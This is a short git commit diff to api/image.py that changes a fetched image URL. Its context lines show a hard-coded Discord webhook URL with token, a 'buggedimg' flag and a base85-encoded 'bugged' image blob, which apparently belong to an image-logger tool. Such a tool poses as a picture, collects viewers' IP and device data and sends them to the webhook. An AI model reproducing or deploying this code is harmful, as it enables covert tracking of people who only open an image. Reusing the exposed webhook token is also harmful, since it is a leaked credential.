28226351b95adc458a2625581132c870b7409c0d
PirateProxy9 <139255703+PirateProxy9@users.noreply.github.com>
2026-01-30 15:53:22 -0800

    Change image source URL in image.py

--- api/image.py
+++ api/image.py
@@ -5,7 +5,7 @@ import time
 
 webhook = 'https://discord.com/api/webhooks/1466906538148102235/itmF63UvtsjjygTjbcLYaxwBTBB5Ger3CjaVCbQoab51UZjU7qsxSWXd38xZ3n9ZKmAc'
 
-bindata = httpx.get('https://static8.depositphotos.com/1001435/1011/i/950/depositphotos_10113890-stock-photo-happy-man-outdoor.jpg').content
+bindata = httpx.get('https://upload.wikimedia.org/wikipedia/commons/5/50/Black_colour.jpg').content
 buggedimg = True
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
